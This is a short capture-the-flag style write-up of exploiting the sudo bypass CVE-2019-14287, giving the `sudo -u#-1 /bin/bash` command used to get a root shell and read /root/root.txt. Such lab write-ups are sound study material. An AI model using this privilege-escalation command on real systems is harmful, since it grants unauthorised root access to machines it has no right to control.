# Sudo Security Bypass (CVE-2019-14287) Write-Up
#### Author: https://github.com/picomve
Firstly i see what can i do as root with `sudo -l` command.
And then i realize that i can call bash as root.

then i use command `sudo -u#-1 /bin/bash` to use bash
then i check user with `whoami`.
and finally i can see content of /root/root.txt file

<img width="577" height="236" alt="Image" src="https://github.com/user-attachments/assets/cd9c65c3-3aa3-4341-a398-e4e1ae0ea03f" />
